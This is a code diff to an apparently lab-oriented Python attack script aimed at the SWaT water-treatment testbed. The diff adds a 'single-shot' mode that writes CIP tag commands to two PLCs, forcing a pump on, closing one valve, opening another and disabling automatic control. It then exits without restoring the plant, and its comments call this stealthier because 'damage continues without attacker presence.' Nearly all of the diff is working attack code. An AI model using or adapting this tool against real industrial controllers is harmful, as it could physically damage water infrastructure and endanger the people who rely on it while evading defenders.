@@ -68,6 +68,39 @@ def ts():
     return datetime.now().strftime('%H:%M:%S')
 
 
+def inject_once(plc1, plc2):
+    """Single-shot attack: write commands once, leave Auto=False, exit.
+    The PLC won't overwrite because auto-control is disabled.
+    More stealthy — no persistent connection for defender to detect."""
+    tprint("[ATTACK] Mode: SINGLE-SHOT (write once, exit)")
+    tprint("[ATTACK] PLC1: P101=ON(manual), MV101=CLOSED(manual)")
+    tprint("[ATTACK] PLC2: MV201=OPEN(manual)")
+    tprint("[ATTACK] Auto=False on all — PLC ladder logic disabled\n")
+
+    # Write attack commands
+    for tag, val in PLC1_CMDS:
+        ret = plc1.Write(tag, val)
+        tprint(f"  PLC1  {tag:25s} = {val}  [{ret.Status}]")
+
+    for tag, val in PLC2_CMDS:
+        ret = plc2.Write(tag, val)
+        tprint(f"  PLC2  {tag:25s} = {val}  [{ret.Status}]")
+
+    # Confirm
+    time.sleep(1)
+    lit  = plc1.Read('HMI_LIT101.Pv').Value
+    fit  = plc1.Read('AI_FIT_101_FLOW').Value
+    mv1  = plc1.Read('HMI_MV101.Cmd').Value
+    mv2  = plc2.Read('HMI_MV201.Cmd').Value
+    p1a  = plc1.Read('HMI_P101.Auto').Value
+
+    tprint(f"\n[ATTACK] Confirmed state:")
+    tprint(f"  MV101={'CLOSED' if mv1==1 else 'OPEN'}  "
+           f"MV201={'OPEN' if mv2==2 else 'CLOSED'}  "
+           f"P101.Auto={p1a}  LIT101={lit:.1f}mm  FIT101={fit:.3f}L/s")
+    tprint("[ATTACK] Commands written. Exiting — damage continues without attacker presence.")
+
+
 def inject_loop(plc1, plc2, duration, interval=1.0):
     tprint(f"[ATTACK] Duration={duration}s")
     tprint(f"[ATTACK] PLC1: P101=ON, MV101=CLOSED")
@@ -149,6 +182,8 @@ def main():
     ap.add_argument('--plc2-ip',  default='192.168.1.20')
     ap.add_argument('--duration', type=int,   default=120)
     ap.add_argument('--interval', type=float, default=1.0)
+    ap.add_argument('--once',     action='store_true',
+                    help='Single-shot: write attack commands once and exit (no continuous loop)')
     args = ap.parse_args()
 
     signal.signal(signal.SIGINT, signal_handler)
@@ -157,7 +192,7 @@ def main():
     print(f"[LOG] Writing to {LOG_FILE}")
     tprint("  SWaT Phase 1 — Direct CIP Tag Injection")
     tprint(f"  PLC1: {args.plc_ip}   PLC2: {args.plc2_ip}")
-    tprint(f"  Duration: {args.duration}s")
+    tprint(f"  Mode: {'SINGLE-SHOT' if args.once else f'CONTINUOUS ({args.duration}s)'}")
     tprint(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print("=" * 60)  # stdout only
 
@@ -178,8 +213,12 @@ def main():
             return
         print(f"[*] PLC2 connected. MV201.Cmd={t2.Value}\n")
 
-        inject_loop(plc1, plc2, args.duration, args.interval)
-        restore(plc1, plc2)
+        if args.once:
+            inject_once(plc1, plc2)
+            # No restore — leave the damage for defence to fix
+        else:
+            inject_loop(plc1, plc2, args.duration, args.interval)
+            restore(plc1, plc2)
 
     tprint("[+] Phase 1 complete.")
 
